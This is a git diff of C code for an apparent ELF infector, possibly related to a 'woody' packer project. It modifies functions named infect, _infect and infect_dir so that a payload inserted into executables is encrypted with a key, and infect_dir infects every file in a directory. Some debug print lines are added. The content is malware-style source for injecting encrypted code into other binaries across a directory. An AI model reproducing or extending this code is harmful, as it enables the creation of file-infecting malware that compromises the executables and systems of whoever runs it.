@@ -70,10 +70,10 @@ void update(char *b, size_t n, size_t old_entry, size_t entry){
 	//inserting KEY
 	p[5] = ((size_t*)KEY)[0];
 	p[6] = ((size_t*)KEY)[1];
-	encrypt((char*)(p+7), 8, (uint32_t*)KEY);
+	encrypt((char*)(p+7), 15, (uint32_t*)KEY);
 }
 
-static int _infect(char **s, size_t *n, char *b, size_t bn){
+static int _infect(char **s, size_t *n, char *b, size_t bn, size_t crypt_off, size_t crypt_len){
 	Elf64_Ehdr *h = (void*)*s;
 	Elf64_Phdr *ph = (*(void**)s) + h->e_phoff;
 
@@ -94,6 +94,10 @@ static int _infect(char **s, size_t *n, char *b, size_t bn){
 	}
 	size_t pos = ph[x].p_offset + ph[x].p_filesz;
 	_insert(s, n, pos, b, bn);
+	println("OK>");
+	printnbln(crypt_off);
+	printnbln(crypt_len);
+	encrypt(((*s) + pos + 1 + crypt_off), crypt_len, (uint32_t*)KEY);
 	//reset it
 	elf_shift_offset(*s, *n, pos, bn);
 	elf_update_flags_of_load_segments(*s, *n);
@@ -133,15 +137,16 @@ char *debug_name(char *fname){
 	return s;
 }
 
-int infect(char *fname, char *outname, char *b, size_t bn){
+int infect(char *fname, char *outname, char *b, size_t bn, size_t crypt_off, size_t crypt_len, int force){
 	char *s; size_t n;
+			println("OK");
 	if (!fget(fname, &s, &n))
 		return fail("failed to open the file");
 	if (elf_check_valid(s, n) == FALSE) return FALSE;
 	if (!check_already_packed(s, n)) return FALSE;
 
 	//after insert, update data
-	if (!_infect(&s,&n, b, bn))
+	if (!_infect(&s,&n, b, bn, crypt_off, crypt_len))
 		return FALSE;
 	if (!fput(outname, s, n))
 		return fail("failed to save to woody");
@@ -150,7 +155,7 @@ int infect(char *fname, char *outname, char *b, size_t bn){
 
 #define LIM 1024
 
-int infect_dir(char *dirname, char *b, size_t bn){
+int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt_len){
 	struct linux_dirent *d;
 	char		*p;
 	char		tmp[LIM];
@@ -163,7 +168,7 @@ int infect_dir(char *dirname, char *b, size_t bn){
 		if (d_isfile(d)){
 			add_base((char *)tmp, dirname, d->d_name, LIM);
 			print(">>>>: ");println(tmp);
-			infect(tmp, debug_name(tmp), b, bn);
+			infect(tmp, debug_name(tmp), b, bn, crypt_off, crypt_len, FALSE);
 		}
 		x += d->d_reclen;
 	}
